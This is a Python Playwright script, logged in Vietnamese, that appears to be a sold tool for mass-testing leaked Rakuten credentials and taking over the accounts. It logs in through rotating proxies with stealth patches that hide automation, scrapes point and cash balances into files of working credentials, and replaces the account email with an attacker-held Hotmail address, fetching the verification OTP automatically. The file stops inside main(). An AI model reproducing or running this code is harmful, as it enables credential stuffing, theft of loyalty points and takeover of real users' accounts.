import time
import random
import logging
import threading
from queue import Queue
import os
import colorama
from datetime import datetime
import signal
import sys
import atexit
import shutil
import requests
import pyautogui
from playwright.sync_api import sync_playwright
from undetected_playwright import Tarnished
import subprocess

def randomUserAgent():
    """Generate a random Chrome user agent with realistic version numbers"""
    def randInt(min_val, max_val):
        return random.randint(min_val, max_val)
    
    major = randInt(100, 120)
    build = randInt(4200, 5400) 
    patch = randInt(10, 200)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{major}.0.{build}.{patch} Safari/537.36"

# Set Playwright browsers path for bundled executable
if getattr(sys, 'frozen', False):
    # Running as bundled executable
    bundle_dir = sys._MEIPASS
    browsers_path = os.path.join(bundle_dir, 'playwright_browsers')
    if not os.path.exists(browsers_path):
        browsers_path = os.path.join(os.path.dirname(sys.executable), 'playwright_browsers')
    os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
# else:
#     # Running as script
#     os.environ["PLAYWRIGHT_BROWSERS_PATH"] = "0"

colorama.init()

successful_accounts = []
failed_accounts = []
browsers = []

def ensure_browsers_installed():
    """Ensure Playwright browsers are installed, especially for bundled executables"""
    try:
        # For bundled executables, try to use portable browser approach
        if getattr(sys, 'frozen', False):
            logging.info("ƒêang ch·∫°y t·ª´ executable, ki·ªÉm tra browsers...")
            
            # Check if browsers exist in the expected paths
            exe_dir = os.path.dirname(sys.executable)
            possible_browser_paths = [
                os.path.join(exe_dir, 'playwright_browsers'),
                os.path.join(exe_dir, '..', 'playwright_browsers'),
                os.path.join(os.getcwd(), 'playwright_browsers'),
            ]
            
            for browser_path in possible_browser_paths:
                if os.path.exists(browser_path):
                    chromium_path = os.path.join(browser_path, 'chromium-*', 'chrome-win', 'chrome.exe')
                    import glob
                    if glob.glob(chromium_path):
                        os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browser_path
                        logging.info(f"‚úÖ ƒê√£ t√¨m th·∫•y browsers t·∫°i: {browser_path}")
                        return True
            
            # Try to install browsers to current directory
            logging.info("ƒêang th·ª≠ c√†i ƒë·∫∑t browsers...")
            browsers_path = os.path.join(os.getcwd(), 'playwright_browsers')
            if not os.path.exists(browsers_path):
                os.makedirs(browsers_path, exist_ok=True)
            
            os.environ["PLAYWRIGHT_BROWSERS_PATH"] = browsers_path
            
            try:
                # Try multiple approaches to install browsers
                install_commands = [
                    ['python', '-m', 'playwright', 'install', 'chromium'],
                    ['playwright', 'install', 'chromium'],
                    ['npx', 'playwright', 'install', 'chromium']
                ]
                
                for cmd in install_commands:
                    try:
                        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300,
                                              env={**os.environ, 'PLAYWRIGHT_BROWSERS_PATH': browsers_path})
                        if result.returncode == 0:
                            logging.info("‚úÖ ƒê√£ c√†i ƒë·∫∑t browsers th√†nh c√¥ng")
                            return True
                        else:
                            logging.debug(f"Command {' '.join(cmd)} failed: {result.stderr}")
                    except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
                        logging.debug(f"Command {' '.join(cmd)} error: {e}")
                        continue
                
                # If all installation attempts fail, show error
                logging.error("‚ùå Kh√¥ng th·ªÉ c√†i ƒë·∫∑t browsers t·ª± ƒë·ªông")
                logging.error("üìù H∆∞·ªõng d·∫´n kh·∫Øc ph·ª•c:")
                logging.error("1. T·∫£i v√† gi·∫£i n√©n Chromium v√†o th∆∞ m·ª•c 'playwright_browsers'")
                logging.error("2. Ho·∫∑c ch·∫°y: python -m playwright install chromium")
                logging.error("3. Sau ƒë√≥ copy th∆∞ m·ª•c browsers v√†o c√πng th∆∞ m·ª•c v·ªõi file .exe")
                return False
                
            except Exception as e:
                logging.warning(f"‚ö†Ô∏è L·ªói khi c√†i ƒë·∫∑t browsers: {e}")
                return False
                
        else:
            # For non-bundled version, try normal installation
            try:
                result = subprocess.run(['python', '-m', 'playwright', 'install', 'chromium'], 
                                      capture_output=True, text=True, timeout=300)
                if result.returncode == 0:
                    logging.info("‚úÖ ƒê√£ c√†i ƒë·∫∑t browsers th√†nh c√¥ng")
                    return True
                else:
                    logging.warning(f"Kh√¥ng th·ªÉ c√†i ƒë·∫∑t browsers: {result.stderr}")
                    return False
            except Exception as e:
                logging.warning(f"L·ªói khi c√†i ƒë·∫∑t browsers: {e}")
                return False
                
    except Exception as e:
        logging.warning(f"L·ªói trong ensure_browsers_installed: {e}")
        return False

def cleanup_browsers():
    """D·ªçn d·∫πp t·∫•t c·∫£ c√°c Browser instances."""
    logging.warning("ƒêang d·ªçn d·∫πp browsers...")
    global browsers
    for browser in browsers[:]:
        try:
            browser.close()
        except Exception as e:
            logging.warning(f"L·ªói khi ƒë√≥ng browser: {e}")
        finally:
            if browser in browsers:
                browsers.remove(browser)

def signal_handler(sig, frame):
    """X·ª≠ l√Ω SIGINT (Ctrl+C) v√† SIGTERM (ƒë√≥ng terminal)."""
    logging.info("Nh·∫≠n t√≠n hi·ªáu d·ª´ng. ƒêang d·ªçn d·∫πp...")
    cleanup_browsers()
    clean_all_user_data()
    logging.info("D·ªçn d·∫πp ho√†n t·∫•t. Tho√°t...")
    sys.exit(0)

# Setup logging
COLOR_RESET = '\033[0m'
COLOR_INFO = '\033[32m'    # Green
COLOR_WARNING = '\033[33m' # Yellow
COLOR_ERROR = '\033[31m'   # Red

class ColorFormatter(logging.Formatter):
    def format(self, record):
        color = ''
        if record.levelno == logging.INFO:
            color = COLOR_INFO
        elif record.levelno == logging.WARNING:
            color = COLOR_WARNING
        elif record.levelno == logging.ERROR:
            color = COLOR_ERROR
        msg = super().format(record)
        return f"{color}{msg}{COLOR_RESET}"
    
    def formatTime(self, record, datefmt=None):
        dt = datetime.fromtimestamp(record.created)
        return dt.strftime("%H:%M")

# Create stream handler with color
console_handler = logging.StreamHandler()
console_handler.setFormatter(ColorFormatter(
    '%(asctime)s - %(levelname)s - %(message)s'
))

# File handler without color
file_handler = logging.FileHandler('rakuten_automation.log', encoding='utf-8')
file_handler.setFormatter(logging.Formatter(
    '%(asctime)s - %(levelname)s - [%(threadName)s] - %(message)s'
))

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    handlers=[file_handler, console_handler]
)

# Hide verbose logs
logging.getLogger('playwright').setLevel(logging.WARNING)
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Global variables
file_lock = threading.Lock()
show_browser = True

def load_input_files():
    """T·∫£i t√†i kho·∫£n t·ª´ accounts.txt v√† proxy t·ª´ proxy.txt"""
    try:
        accounts = []
        with open('accounts.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and '||' in line:
                    parts = line.split('||')
                    if len(parts) >= 2:
                        accounts.append({
                            'email': parts[0].strip(),
                            'password': parts[1].strip()
                        })

        hotmails = []
        with open('hotmail.txt', 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    line = line.strip()
                    hotmails.append(line)
        
        # Load proxies (optional)
        proxies = []
        try:
            with open('proxy.txt', 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Handle different proxy formats
                        if '@' in line:
                            # Format: host:port@username:password
                            try:
                                host_port, credentials = line.split('@', 1)
                                if ':' in credentials:
                                    username, password = credentials.split(':', 1)
                                else:
                                    username, password = credentials, ""
                                
                                proxies.append({
                                    'server': f"http://{host_port}",
                                    'username': username,
                                    'password': password,
                                    'full': line
                                })
                            except Exception as e:
                                logging.warning(f"Kh√¥ng th·ªÉ parse proxy: {line} - {e}")
                        else:
                            # Handle format: host:port:username:password or host:port
                            parts = line.split(':')
                            if len(parts) >= 4:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': parts[2],
                                    'password': parts[3],
                                    'full': line
                                })
                            elif len(parts) >= 2:
                                proxies.append({
                                    'server': f"http://{parts[0]}:{parts[1]}",
                                    'username': None,
                                    'password': None,
                                    'full': line
                                })
        except FileNotFoundError:
            logging.warning("proxy.txt kh√¥ng t√¨m th·∫•y. Ch·∫°y m√† kh√¥ng d√πng proxy.")
        
        if not accounts:
            logging.error("Kh√¥ng t√¨m th·∫•y t√†i kho·∫£n h·ª£p l·ªá trong accounts.txt")
            raise ValueError("Kh√¥ng c√≥ t√†i kho·∫£n ƒë·ªÉ x·ª≠ l√Ω")
        
        logging.info(f"ƒê√£ t·∫£i {len(accounts)} t√†i kho·∫£n v√† {len(proxies)} proxy")
        return accounts, proxies, hotmails
    
    except Exception as e:
        logging.error(f"L·ªói khi t·∫£i file ƒë·∫ßu v√†o: {repr(e)}")
        raise


def init_browser(proxy=None, email=None, size=(1366, 768)):
    """Kh·ªüi t·∫°o Playwright browser v·ªõi c√†i ƒë·∫∑t kh√¥ng b·ªã ph√°t hi·ªán"""
    
    try:
        playwright = sync_playwright().start()
    except Exception as e:
        logging.error(f"L·ªói kh·ªüi t·∫°o Playwright: {e}")
        # Try to ensure browsers are installed
        if ensure_browsers_installed():
            try:
                playwright = sync_playwright().start()
            except Exception as e2:
                logging.error(f"V·∫´n kh√¥ng th·ªÉ kh·ªüi t·∫°o Playwright sau khi c√†i ƒë·∫∑t browsers: {e2}")
                raise
        else:
            raise
    
    # User data directory
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if email:
        user_data_dir = os.path.join(user_data_dir, f"user-data-{email.replace('@', '_').replace('.', '_')}")
    if not os.path.exists(user_data_dir):
        os.makedirs(user_data_dir)
    
    # Browser launch options
    launch_options = {
        'headless': not show_browser,
        'args': [
            '--no-sandbox',
            '--disable-dev-shm-usage',
            '--disable-blink-features=AutomationControlled',
            '--disable-infobars'
        ]
    }
    random_user_agent = randomUserAgent()
    # Context options
    context_options = {
        'user_agent': random_user_agent,
        'viewport': {'width': size[0], 'height': size[1]},
        'locale': 'ja-JP',
        'timezone_id': 'Asia/Tokyo',
        "geolocation": {
                'latitude': 35.6895,
                'longitude': 139.6917
        },
        "permissions": ['geolocation']
    }
    
    # Add proxy if provided
    if proxy:
        logging.debug(f"Setting up proxy: {proxy}")
        context_options['proxy'] = proxy
    
    try:
        browser = playwright.chromium.launch(**launch_options)
        context = browser.new_context(**context_options)
        Tarnished.apply_stealth(context)
        context.add_init_script("""
                        (() => {
                            try {
                                Object.defineProperty(navigator, 'webdriver', { get: () => false, configurable: true });
                                window.navigator.chrome = { runtime: {} };
                                Object.defineProperty(navigator, 'languages', { get: () => ['ja-JP','ja'] });
                                Object.defineProperty(navigator, 'plugins', { get: () => [1,2,3,4,5] });
                                const orig = navigator.permissions.query;
                                navigator.permissions.query = (p) => p && p.name === 'notifications' ? Promise.resolve({ state: Notification.permission }) : orig(p);
                            } catch(e) {}
                        })();
                """)
        
        page = context.new_page()
        
        return browser, context, page, user_data_dir, playwright
        
    except Exception as e:
        logging.error(f"L·ªói kh·ªüi t·∫°o browser: {e}")
        playwright.stop()
        raise

async def human_type(page, selector, text, min_delay=0.05, max_delay=0.15):
    """Type text with human-like delay"""
    await page.fill(selector, "")  # Clear first
    for char in text:
        await page.type(selector, char, delay=random.uniform(min_delay, max_delay) * 1000)

def _remove_account_from_file(email):
    """Remove account from accounts.txt file"""
    try:
        with file_lock:
            with open('accounts.txt', 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            with open('accounts.txt', 'w', encoding='utf-8') as f:
                for line in lines:
                    if line.strip() and not line.startswith('#'):
                        parts = line.strip().split('||')
                        if len(parts) >= 1 and parts[0].strip() != email:
                            f.write(line)
                    else:
                        f.write(line)
            logging.debug(f"üóëÔ∏è ƒê√£ x√≥a {email} kh·ªèi accounts.txt")
    except Exception as e:
        logging.warning(f"Kh√¥ng th·ªÉ x√≥a {email} kh·ªèi accounts.txt: {e}")

def check_rakuten_account(browser, context, page, email, password, hotmail=None):
    """Ki·ªÉm tra t√†i kho·∫£n Rakuten"""
    try:
        logging.info(f"B·∫Øt ƒë·∫ßu ki·ªÉm tra t√†i kho·∫£n: {email}")
        
        # Navigate to login page with retry logic
        login_url = ("https://login.account.rakuten.com/sso/authorize?client_id=rakuten_ichiba_top_web&service_id=s245&response_type=code&scope=openid&redirect_uri=https%3A%2F%2Fwww.rakuten.co.jp%2F#/sign_in")
        
        # Try to navigate with retry mechanism
        max_retries = 3
        for attempt in range(max_retries):
            try:
                # Increase timeout for slow proxies
                page.goto(login_url, timeout=60000)  # 60 seconds timeout
                logging.debug(f"Successfully navigated to login page for {email} (attempt {attempt + 1})")
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    logging.debug(f"Failed to navigate to login page for {email} after {max_retries} attempts: {repr(e)}")
                    raise
                else:
                    logging.debug(f"Navigation attempt {attempt + 1} failed for {email}, retrying... Error: {repr(e)}")
                    time.sleep(5)  # Wait before retry

        time.sleep(random.randint(2, 5))
        is_valid_hot_mail = False
        result = True, "ƒêƒÉng nh·∫≠p th√†nh c√¥ng"
        # Step 1: Enter email
        if not _enter_email(page, email):
            result = False, f"L·ªói nh·∫≠p email cho {email}"
        # Step 2: Enter password
        elif not _enter_password(page, password):
            result = False, f"L·ªói nh·∫≠p password cho {email}"
        # Step 3: Check login success
        elif not _check_login_success(page, email):
            result = False, "ƒêƒÉng nh·∫≠p th·∫•t b·∫°i"
        else:
            # Step 4: Check points
            result = _check_points(page, email, password)
            # Step 5: Change Email
            if hotmail:
                change_result, change_message = _change_email(page, email, password, hotmail)
                if change_result:
                    is_valid_hot_mail = True
        
        _remove_account_from_file(email)        
        return result[0], result[1], is_valid_hot_mail

    except Exception as e:
        logging.error(f"‚ùå L·ªói trong qu√° tr√¨nh ki·ªÉm tra cho {email}: {repr(e)}")
        # Remove account even if there's an exception
        _remove_account_from_file(email)
        return False, repr(e), False

def _enter_email(page, email):
    """Enter email in login form"""
    try:
        # Wait for email input field
        page.wait_for_selector("input#user_id", timeout=30000)
        
        # Type email with human-like delay
        page.fill("input#user_id", email)
        time.sleep(random.randint(1, 2))
        
        # Click first submit button (Next)
        # page.click("#cta001")
        # time.sleep(random.randint(2, 4))
        # Press Enter key to submit
        page.keyboard.press("Enter")
        return True
        
    except Exception as e:
        logging.debug(f"L·ªói khi nh·∫≠p email: {repr(e)}")
        return False

def _enter_password(page, password):
    """Enter password in login form"""
    try:
        # Wait for password input field
        page.wait_for_selector("input#password_current", timeout=30000)
        
        # Type password with human-like delay
        page.fill("input#password_current", password)
        time.sleep(random.randint(1, 2))
        
        page.keyboard.press("Enter")
        # Click second submit button (Next)
        # page.click("#cta011")
        
        # Wait for login to process
        time.sleep(5)
        
        return True
        
    except Exception as e:
        debug_folder = "debug_output"
        os.makedirs(debug_folder, exist_ok=True)
        
        logging.error(f"Kh√¥ng t√¨m th·∫•y √¥ password. B·∫Øt ƒë·∫ßu thu th·∫≠p b·∫±ng ch·ª©ng...")
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(debug_folder, f"debug_screenshot_{timestamp}.png")
        page.screenshot(path=screenshot_path, full_page=True)
        logging.info(f"ƒê√£ l∆∞u ·∫£nh ch·ª•p m√†n h√¨nh l·ªói t·∫°i: {screenshot_path}")
        html_path = os.path.join(debug_folder, f"debug_page_{timestamp}.html")
        with open(html_path, "w", encoding="utf-8") as f:
            f.write(page.content())
        logging.info(f"ƒê√£ l∆∞u m√£ HTML c·ªßa trang l·ªói t·∫°i: {html_path}")
        # logging.debug(f"L·ªói khi nh·∫≠p password: {repr(e)}")
        return False

def _check_login_success(page, email):
    """Check if login was successful"""
    try:
        check_skip(page)

        # Wait for potential redirect to rakuten.co.jp domain with longer timeout for slow proxies
        page.wait_for_function(
            "window.location.href.includes('rakuten.co.jp')",
            timeout=30000  # Increased to 30 seconds for slow proxies
        )
        
        current_url = page.url
        
        # If still on login page, login failed
        if "login.account.rakuten.com" in current_url:
            # Check for error messages
            try:
                error_elements = page.query_selector_all(".error, .alert, [class*='error'], [class*='alert']")
                if error_elements:
                    error_text = error_elements[0].text_content()
                    logging.debug(f"ƒêƒÉng nh·∫≠p th·∫•t b·∫°i cho {email}: {error_text}")
                    return False
            except:
                pass
            
            logging.warning(f"ƒêƒÉng nh·∫≠p th·∫•t b·∫°i cho {email}: Acc Die")
            return False
        
        return True
        
    except Exception as e:
        logging.debug(f"Timeout ho·∫∑c l·ªói ch·ªù redirect cho {email}: {repr(e)}")
        return False

def _check_points(page, email, password):
    """Check points information and save to appropriate file"""
    try:
        # Navigate to points page with retry
        points_url = "https://point.rakuten.co.jp/?l-id=top_normal_myrakuten_point"
        
        def goto_link(url):
            max_retries = 2
            for attempt in range(max_retries):
                try:
                    page.goto(url, timeout=30000) 
                    page.wait_for_load_state('networkidle', timeout=15000)
                    break
                except Exception as e:
                    if attempt == max_retries - 1:
                        logging.debug(f"Failed to navigate to points page for {email}: {repr(e)}")
                        return True, f"ƒêƒÉng nh·∫≠p th√†nh c√¥ng nh∆∞ng kh√¥ng th·ªÉ truy c·∫≠p trang ƒëi·ªÉm : {url}"
                    else:
                        logging.debug(f"Points page navigation attempt {attempt + 1} failed for {email}, retrying...")
                        time.sleep(3)

        goto_link(points_url)
        
        points_details = []
        
        try:
            try:
                page.wait_for_selector(".point-total dd", timeout=5000)
                held_points_element = page.query_selector(".point-total dd")
                if held_points_element:
                    held_points_text = held_points_element.text_content().strip()
                    held_points_clean = ''.join(filter(str.isdigit, held_points_text))
                    if held_points_clean:
                        held_points_value = int(held_points_clean)
                        points_details.append(f"Total Point: {held_points_value:,}")
                        logging.debug(f"üìä {email} - Points total: {held_points_value:,}")
            except Exception:
                logging.debug(f"Kh√¥ng t√¨m th·∫•y 'Points total' cho {email}")

            try:
                page.wait_for_selector(".point-gadget-display-point .point_num", timeout=5000)
                operation_points_element = page.query_selector(".point-gadget-display-point .point_num")
                if operation_points_element:
                    operation_points_text = operation_points_element.text_content().strip()
                    operation_points_clean = ''.join(filter(str.isdigit, operation_points_text))
                    if operation_points_clean:
                        operation_points_value = int(operation_points_clean)
                        points_details.append(f"Operation: {operation_points_value:,}")
                        logging.debug(f"üìà {email} - Points in operation: {operation_points_value:,}")
            except Exception:
                logging.debug(f"Kh√¥ng t√¨m th·∫•y 'Points in operation' cho {email}")

            try:
                page.wait_for_selector("#js-pointBankTotalBalance .point_num", timeout=5000)
                add_points_element = page.query_selector("#js-pointBankTotalBalance .point_num")
                if add_points_element:
                    add_points_text = add_points_element.text_content().strip()
                    add_points_clean = ''.join(filter(str.isdigit, add_points_text))
                    if add_points_clean:
                        add_points_value = int(add_points_clean)
                        points_details.append(f"Add: {add_points_value:,}")
                        logging.debug(f"‚ûï {email} - Points add: {add_points_value:,}")
            except Exception:
                logging.debug(f"Kh√¥ng t√¨m th·∫•y 'Points add' cho {email}")

            goto_link("https://my.rakuten.co.jp/?l-id=pc_footer_account")
            time.sleep(3)

            try:
                page.wait_for_selector('[data-ratid="available-rcash-area"]', timeout=5000)
                cash_points_element = page.query_selector('[data-ratid="available-rcash-area"] span:nth-child(2)')
                if cash_points_element:
                    cash_points_text = cash_points_element.text_content().strip()
                    cash_points_clean = ''.join(filter(str.isdigit, cash_points_text))
                    if cash_points_clean:
                        cash_points_value = int(cash_points_clean)
                        points_details.append(f"Cash: {cash_points_value:,}")
                        logging.debug(f"‚ûï {email} - Cash Point: {cash_points_value:,}")
            except Exception:
                logging.debug(f"Kh√¥ng t√¨m th·∫•y 'Points add' cho {email}")

            
                
            if len(points_details) > 0:
                points_summary = " | ".join(points_details)
                logging.info(f"‚úÖ {email} - ({points_summary})")
                
                # Save to appropriate file based on points
                with file_lock:
                    with open('point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|{points_summary}\n")
                    return True, f"C√≥ ƒëi·ªÉm: ({points_summary})"
            else:
                logging.info(f"üì≠ {email} - Kh√¥ng c√≥ ƒëi·ªÉm")
                with file_lock:
                    with open('no_point_account.txt', 'a', encoding='utf-8') as f:
                        f.write(f"{email}|{password}|0\n")
                    return True, "Kh√¥ng c√≥ ƒëi·ªÉm"
                
        except Exception as e:
            logging.debug(f"Kh√¥ng t√¨m th·∫•y th√¥ng tin ƒëi·ªÉm cho {email}: {repr(e)}")
            # Still consider login successful even if can't read points
            return True, "ƒêƒÉng nh·∫≠p th√†nh c√¥ng nh∆∞ng kh√¥ng t√¨m th·∫•y ƒëi·ªÉm"
            
    except Exception as e:
        logging.debug(f"L·ªói khi ki·ªÉm tra ƒëi·ªÉm cho {email}: {repr(e)}")
        return True, "ƒêƒÉng nh·∫≠p th√†nh c√¥ng nh∆∞ng l·ªói ki·ªÉm tra ƒëi·ªÉm"


from hotmail import Hotmail
import re
import html
import inspect

def extract_otp_from_html(html_content):
    if not html_content:
        return None

    # Normalize / unescape
    s = html.unescape(html_content)

    # --- Original methods kept first (preserve behaviour) ---
    pattern1 = r'your verification code is:</span></div></td></tr>.*?<div[^>]*><span>(\d{6})</span></div>'
    m = re.search(pattern1, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    pattern2 = r'verification code.*?(\d{6})'
    m = re.search(pattern2, s, re.IGNORECASE | re.DOTALL)
    if m:
        return m.group(1).strip()

    # Find 6-digit codes but exclude hex color codes
    pattern3 = r'\b(\d{6})\b'
    for match in re.finditer(pattern3, s):
        # Get the position and the 6-digit code
        start_pos = match.start()
        end_pos = match.end()
        six_digit_code = match.group(1)
        
        # Check if it's part of a color code by looking at characters before it
        prefix = s[max(0, start_pos-1):start_pos]
        if prefix == '#':
            # Skip this match as it's likely a color code
            continue
            
        # Also check for "color code" text nearby (20 chars before)
        nearby_text = s[max(0, start_pos-20):start_pos].lower()
        if 'color' in nearby_text and 'code' in nearby_text:
            # Skip this match as it's described as a color code
            continue
            
        # If we got here, it's not a color code, so return it
        return six_digit_code.strip()
        
    return None

def _get_otp_from_hotmail(hotmail, otp_code = None):
    hotmail.get_access_token()
    try:
            for _ in range(30):
                try:
                    messages = hotmail.get_messages()
                    for msg in messages:
                        otp = extract_otp_from_html(msg)
                        if otp and str(otp) != str(otp_code):
                            logging.info(f"‚úÖ L·∫•y OTP th√†nh c√¥ng: {otp}")
                            return otp
                except:
                    pass
                time.sleep(random.uniform(5, 15))
            return None
    except Exception as e:
            logging.error(f"C·∫¢NH B√ÅO: L·ªói khi g·ªçi API OTP: {str(e)}")
            return None
def check_skip(page):
    try:
        page.wait_for_selector('#seco_473', timeout=5000)
        page.click('#seco_473')
        time.sleep(5)
    except Exception:
        pass

def _change_email(page, email, password, hotmail):
    try:
        try:
            new_email, _, refresh_token, client_id = hotmail.split('|')
        except Exception:
            logging.error(f"L·ªói parse hotmail string: {hotmail}")
            return False, "L·ªói parse hotmail string"

        page.goto("https://profile.id.rakuten.co.jp/account-security", timeout=60000)
        check_skip(page)
        time.sleep(3)

        # If redirected to login, retry to open the account-security page
        if "login.account.rakuten.com" in page.url:
            page.goto("https://profile.id.rakuten.co.jp/account-security", timeout=60000)
            time.sleep(3)

        # Click change email button
        try:
            page.wait_for_selector('[data-qa-id="email-edit-field"]', timeout=15000)
            page.click('[data-qa-id="email-edit-field"]')
            time.sleep(1.5)
        except Exception as e: 
            logging.error(f"Kh√¥ng t√¨m th·∫•y n√∫t s·ª≠a email: {repr(e)}")
            return False, "Kh√¥ng t√¨m th·∫•y n√∫t s·ª≠a email"

        # Wait for email input and type new email
        try:
            page.wait_for_selector('input[name="email"]', timeout=15000)
            page.fill('input[name="email"]', new_email)
            time.sleep(0.8)
        except Exception as e:
            logging.error(f"L·ªói khi nh·∫≠p email m·ªõi: {repr(e)}")
            return False, "L·ªói khi nh·∫≠p email m·ªõi"

        # Click submit update email
        try:
            page.wait_for_selector('[data-qa-id="submit-update-email"]', timeout=10000)
            page.click('[data-qa-id="submit-update-email"]')
        except Exception as e:
            logging.error(f"Kh√¥ng t√¨m th·∫•y n√∫t submit update email: {repr(e)}")
            return False, "Kh√¥ng t√¨m th·∫•y n√∫t submit update email"

        time.sleep(15)
        hotmail_obj = Hotmail(email, password, refresh_token, client_id)

        otp_code = _get_otp_from_hotmail(hotmail_obj)
        if not otp_code:
            logging.error(f"Kh√¥ng l·∫•y ƒë∆∞·ª£c OTP t·ª´ hotmail cho {email}")
            return False, "Kh√¥ng l·∫•y ƒë∆∞·ª£c OTP t·ª´ hotmail"

        try:
            page.wait_for_selector('#VerifyCode', timeout=60000)
            # _type_like_human(page, '#VerifyCode', str(otp_code))
            page.fill('#VerifyCode', str(otp_code))
            time.sleep(3)
            page.click('#submit')
            logging.info(f"ƒê√£ g·ª≠i OTP ƒë·ªÉ x√°c th·ª±c email cho {email}")
            time.sleep(10)
        except Exception as e:
            logging.error(f"L·ªói khi nh·∫≠p/submit OTP cho {email}: {repr(e)}")
            return False, "L·ªói khi nh·∫≠p/submit OTP"

        return True, f"{new_email}"
    except Exception as e:
        logging.error(f"L·ªói khi ƒë·ªïi email cho {email}: {repr(e)}")
        return False, "None"


hotmail_need_deletes = []

def process_account(browser, context, page, user_data_dir, playwright, account, account_index, hotmails):
    """X·ª≠ l√Ω ƒëƒÉng k√Ω m·ªôt t√†i kho·∫£n"""
    email, password = account['email'], account['password']
    hotmail = hotmails[account_index % len(hotmails)] if len(hotmails) > 0 else None
    # logging.info(f"S·ª≠ d·ª•ng hotmail: {hotmail} cho t√†i kho·∫£n {email}")
    try:
        logging.debug(f"ƒêang x·ª≠ l√Ω t√†i kho·∫£n {account_index + 1}: {email}")
        success, message, is_valid_hot_mail = check_rakuten_account(browser, context, page, email, password, hotmail)
        if not success:
            logging.warning(f"ƒêƒÉng nh·∫≠p th·∫•t b·∫°i cho {email}: Acc Die")
        elif is_valid_hot_mail:
            hotmail_need_deletes.append(hotmail)

        with file_lock:
            if success:
                successful_accounts.append(account)
                # L∆∞u t√†i kho·∫£n th√†nh c√¥ng
                with open('successful_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else 'None'}\n")
            else:
                failed_accounts.append({'account': account, 'error': message})
                # L∆∞u t√†i kho·∫£n th·∫•t b·∫°i
                with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{email}|{password}|{message}|{hotmail if is_valid_hot_mail else 'None'}\n")
        logging.info(f"Ho√†n t·∫•t x·ª≠ l√Ω t√†i kho·∫£n: {email}")
    except Exception as e:
        logging.error(f"L·ªói x·ª≠ l√Ω t√†i kho·∫£n {email}: {repr(e)}")
        with file_lock:
            failed_accounts.append({'account': account, 'error': repr(e)})
            with open('failed_accounts.txt', 'a', encoding='utf-8') as f:
                f.write(f"{email}|{password}|{'Acc lock ho·∫∑c l·ªói pass'}\n")
    finally:
        # Cleanup browser resources
        try:
            context.close()
            browser.close()
            playwright.stop()
        except Exception as e:
            logging.debug(f"L·ªói khi ƒë√≥ng browser: {e}")
        
        if hotmail and hotmail in hotmail_need_deletes:
                hotmail_need_deletes.remove(hotmail)
                try:
                    with file_lock:
                        with open('hotmail.txt', 'r', encoding='utf-8') as f:
                            lines = f.readlines()
                        
                        with open('hotmail.txt', 'w', encoding='utf-8') as f:
                            for line in lines:
                                if line.strip() and not line.startswith('#'):
                                    if line.strip() != hotmail:
                                        f.write(line)
                                else:
                                    f.write(line)
                except Exception as e:
                    pass
        # Delete user_data_dir
        for _ in range(3):
            try:
                if user_data_dir and os.path.exists(user_data_dir):
                    shutil.rmtree(user_data_dir, ignore_errors=True)
                break
            except:
                time.sleep(5)

def clean_all_user_data(retries=5, delay=1):
    """D·ªçn d·∫πp t·∫•t c·∫£ th∆∞ m·ª•c d·ªØ li·ªáu ng∆∞·ªùi d√πng"""
    logging.debug("ƒêang d·ªçn d·∫πp d·ªØ li·ªáu ng∆∞·ªùi d√πng...")
    user_data_dir = os.path.join(os.getcwd(), "user-data")
    if os.path.exists(user_data_dir):
        for _ in range(retries):
            try:
                shutil.rmtree(user_data_dir)
                logging.info("ƒê√£ d·ªçn d·∫πp d·ªØ li·ªáu ng∆∞·ªùi d√πng th√†nh c√¥ng.")
                break
            except PermissionError:
                time.sleep(delay)
            except Exception as e:
                time.sleep(delay)

def check_key_live():
    """Ki·ªÉm tra key c√≥ live kh√¥ng t·ª´ GitHub"""
    try:
        trial_url = "https://raw.githubusercontent.com/sang2770/storage/master/trial.json"
        
        logging.info("ƒêang ki·ªÉm tra key live...")
        response = requests.get(trial_url, timeout=10)
        
        if response.status_code == 404:
            logging.error("‚ùå Key ƒë√£ h·∫øt h·∫°n ho·∫∑c kh√¥ng t·ªìn t·∫°i (404).")
            print("\n" + "="*50)
            print("üîë KEY ƒê√É H·∫æT H·∫†N HO·∫∂C KH√îNG T·ªíN T·∫†I")
            print("Vui l√≤ng li√™n h·ªá ƒë·ªÉ gia h·∫°n key.")
            print("="*50)
            return False
        elif response.status_code == 200:
            logging.info("‚úÖ Key live - Cho ph√©p ch·∫°y ch∆∞∆°ng tr√¨nh.")
            return True
        else:
            logging.warning(f"‚ö†Ô∏è Kh√¥ng th·ªÉ ki·ªÉm tra key (HTTP {response.status_code}). Ti·∫øp t·ª•c ch·∫°y...")
            return True
            
    except requests.exceptions.Timeout:
        logging.warning("‚ö†Ô∏è Timeout khi ki·ªÉm tra key. Ti·∫øp t·ª•c ch·∫°y...")
        return True
    except requests.exceptions.ConnectionError:
        logging.warning("‚ö†Ô∏è Kh√¥ng c√≥ k·∫øt n·ªëi internet. Ti·∫øp t·ª•c ch·∫°y...")
        return True
    except Exception as e:
        logging.warning(f"‚ö†Ô∏è L·ªói khi ki·ªÉm tra key: {repr(e)}. Ti·∫øp t·ª•c ch·∫°y...")
        return True

def main():
    """H√†m ch√≠nh"""
    global show_browser
    # Check if key is live before proceeding
    if not check_key_live():
